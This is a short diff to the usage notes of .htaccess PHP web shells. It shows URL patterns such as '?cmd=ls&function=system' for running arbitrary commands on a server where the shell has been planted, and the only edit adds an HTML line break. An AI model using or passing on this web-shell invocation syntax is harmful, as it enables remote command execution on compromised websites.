@@ -4,7 +4,7 @@ Usage for jhax0r_php.shell.htaccess
 site.com/urfile.ht?c=command here
 
 Usage for .htaccess Multifunctional Shell
-- CMD Command
+- CMD Command<br>
 .htaccess?cmd=command&function=function
 Exp:
 .htaccess?cmd=ls&function=system
